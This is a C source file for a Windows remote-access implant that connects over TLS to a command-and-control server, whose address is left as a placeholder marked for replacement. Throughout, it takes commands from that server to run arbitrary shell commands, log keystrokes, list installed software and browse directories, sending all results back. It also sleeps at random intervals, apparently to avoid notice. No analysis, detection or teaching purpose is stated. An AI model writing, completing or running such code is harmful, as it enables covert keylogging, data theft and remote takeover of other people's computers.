#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <shellapi.h>
#include <psapi.h>

#pragma comment(lib, "ws2_32.lib")
#define BUFFER_SIZE 1024
#define C2_SERVER_IP "127.0.0.1"  // Replace with actual C2 server IP
#define C2_SERVER_PORT 443        // Replace with actual C2 server port

// Initialize Winsock
int initialize_winsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return 1;
    }
    return 0;
}

// Initialize OpenSSL
SSL_CTX* initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    
    if (!ctx) {
        printf("Error initializing OpenSSL context.\n");
        return NULL;
    }
    return ctx;
}

// Clean up OpenSSL
void cleanup_openssl() {
    EVP_cleanup();
}

// Randomized sleep
void random_sleep() {
    int sleep_time = (rand() % 600) * 1000;  // Random sleep up to 10 minutes
    Sleep(sleep_time);
}

// Establish connection to C2 server using SSL
SSL* connect_to_c2(SSL_CTX* ctx) {
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_SERVER_PORT);
    inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("Failed to create socket.\n");
        return NULL;
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        printf("Failed to connect to C2 server.\n");
        closesocket(sock);
        return NULL;
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    if (SSL_connect(ssl) <= 0) {
        printf("SSL handshake failed.\n");
        SSL_free(ssl);
        closesocket(sock);
        return NULL;
    }

    printf("Connected to C2 server with SSL.\n");
    return ssl;
}

// Send data to C2 server
void send_data_to_c2(SSL* ssl, const char* data) {
    if (SSL_write(ssl, data, strlen(data)) <= 0) {
        printf("Failed to send data to C2.\n");
    } else {
        printf("Data sent to C2 server.\n");
    }
}

// Receive data from C2 server
void receive_data_from_c2(SSL* ssl, char* buffer) {
    int bytes_received = SSL_read(ssl, buffer, BUFFER_SIZE - 1);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        printf("Received data from C2 server: %s\n", buffer);
    } else {
        printf("No data received from C2 server.\n");
    }
}

// Change Directory (cd)
void change_directory(SSL* ssl, const char* path) {
    if (SetCurrentDirectory(path)) {
        send_data_to_c2(ssl, "Directory changed successfully.\n");
    } else {
        send_data_to_c2(ssl, "Failed to change directory.\n");
    }
}

// Get current working directory (pwd)
void get_current_directory(SSL* ssl) {
    char cwd[BUFFER_SIZE];
    if (GetCurrentDirectory(BUFFER_SIZE, cwd)) {
        send_data_to_c2(ssl, cwd);
    } else {
        send_data_to_c2(ssl, "Failed to get current directory.\n");
    }
}

// List installed applications
void list_installed_applications(SSL* ssl) {
    char buffer[BUFFER_SIZE];
    HKEY hUninstallKey = NULL, hAppKey = NULL;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hUninstallKey) != ERROR_SUCCESS) {
        send_data_to_c2(ssl, "Failed to access registry for installed applications.\n");
        return;
    }
    
    DWORD index = 0;
    char appName[BUFFER_SIZE];
    while (RegEnumKeyEx(hUninstallKey, index, appName, &(DWORD){BUFFER_SIZE}, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        snprintf(buffer, BUFFER_SIZE, "Application: %s\n", appName);
        send_data_to_c2(ssl, buffer);
        index++;
    }
    RegCloseKey(hUninstallKey);
}

// Save keystrokes for X time (capture for 10 seconds as example)
void capture_keystrokes(SSL* ssl, int duration_seconds) {
    char keystrokes[BUFFER_SIZE] = "";
    DWORD startTime = GetTickCount();
    
    while ((GetTickCount() - startTime) / 1000 < duration_seconds) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                char keychar = (char)key;
                strncat(keystrokes, &keychar, 1);
            }
        }
        Sleep(10);  // Avoid busy-looping too much
    }
    
    send_data_to_c2(ssl, keystrokes);
}

// Run cmd command and send output to C2
void run_cmd_command(SSL* ssl, const char* command) {
    char buffer[BUFFER_SIZE];
    FILE* pipe = _popen(command, "r");
    if (!pipe) {
        send_data_to_c2(ssl, "Failed to execute command.\n");
        return;
    }
    while (fgets(buffer, BUFFER_SIZE, pipe) != NULL) {
        send_data_to_c2(ssl, buffer);
    }
    _pclose(pipe);
}

// Main loop that communicates with the C2 server while performing random actions
void main_loop(SSL* ssl) {
    char buffer[BUFFER_SIZE];
    while (1) {
        // Receive command from C2
        receive_data_from_c2(ssl, buffer);

        if (strncmp(buffer, "CD ", 3) == 0) {
            change_directory(ssl, buffer + 3);  // Change directory based on path in command
        } else if (strcmp(buffer, "PWD") == 0) {
            get_current_directory(ssl);  // Get current working directory
        } else if (strcmp(buffer, "LIST_APPS") == 0) {
            list_installed_applications(ssl);  // List installed applications
        } else if (strncmp(buffer, "KEYLOG", 6) == 0) {
            int duration = atoi(buffer + 7);  // Capture keystrokes for specified duration
            capture_keystrokes(ssl, duration);
        } else if (strncmp(buffer, "CMD ", 4) == 0) {
            run_cmd_command(ssl, buffer + 4);  // Run specified command
        } else {
            printf("Unknown command received: %s\n", buffer);
        }

        random_sleep();
    }
}

int main() {
    srand(time(NULL));  // Seed random number generator

    // Initialize Winsock
    if (initialize_winsock() != 0) {
        return 1;
    }

    // Initialize OpenSSL
    SSL_CTX* ctx = initialize_openssl();
    if (!ctx) {
        WSACleanup();
        return 1;
    }

    // Connect to C2 server using SSL
    SSL* ssl = connect_to_c2(ctx);
    if (!ssl) {
        SSL_CTX_free(ctx);
        WSACleanup();
        return 1;
    }

    // Enter the main communication loop with the C2 server
    main_loop(ssl);

    // Cleanup
    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    cleanup_openssl();
    WSACleanup();

    return 0;
}
